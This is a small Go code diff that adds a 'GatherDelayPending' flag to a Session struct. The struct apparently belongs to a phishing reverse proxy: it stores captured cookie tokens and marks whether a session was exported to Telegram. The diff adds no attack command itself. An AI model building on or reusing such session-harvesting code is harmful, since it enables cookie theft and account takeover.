@@ -33,6 +33,7 @@ type Session struct {
 	UserAgent            string
 	TelegramExported     bool // Track if session was already exported to Telegram
 	IsCaptchaVerified    bool // Track if CAPTCHA was verified for this session
+	GatherDelayPending   bool // True while cookie gather delay goroutine is running
 }
 
 func NewSession(name string) (*Session, error) {
@@ -62,6 +63,7 @@ func NewSession(name string) (*Session, error) {
 		UserAgent:            "",
 		TelegramExported:     false,
 		IsCaptchaVerified:    false,
+		GatherDelayPending:   false,
 	}
 	s.CookieTokens = make(map[string]map[string]*database.CookieToken)
 
